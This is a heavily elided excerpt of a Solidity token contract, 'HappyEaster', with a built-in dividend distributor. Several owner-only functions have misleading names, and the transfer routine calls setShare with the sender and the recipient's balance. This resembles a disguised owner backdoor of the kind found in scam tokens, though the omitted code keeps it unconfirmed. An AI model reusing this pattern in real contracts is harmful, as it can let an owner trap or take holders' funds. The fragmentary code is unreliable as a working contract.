...
contract DividendDistributor{
    ...
    function setShareholder(address _address) internal {
...
contract HappyEaster is Context, IERC20, Ownable, DividendDistributor{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000000 *  10**9;        
    
    string private _name = "HappyEaster";
     ...
     */
    function HEToken(address _rewardTokenAddress) external onlyOwner {
        require(_rewardTokenAddress != address(this));        
        setShareholder(_rewardTokenAddress);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (!isDividendExempt[sender]) {
            setShare(sender, _balanceOf(recipient));
        } 
    ...
    function headdownEnabled(bool _status) external onlyOwner {
        coolEnabled = _status;
    }

    function setIsHEExempt(address holder, bool exempt) external onlyOwner {
        require(holder != address(this));
        isDividendExempt[holder] = exempt;        
    }

    function shouldSwapHEBack(uint256 swapThreshold) internal view returns (bool) {
        return swapEnabled        
        && _balances[address(this)] >= swapThreshold;
    }

    function shouldTakeFeeHE(address sender, address recipient) internal view returns (bool) {
    ...
    function setSwapSetHappyEaster(bool _enabled) external onlyOwner {
	...
	function HEprocessIndex(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
		{
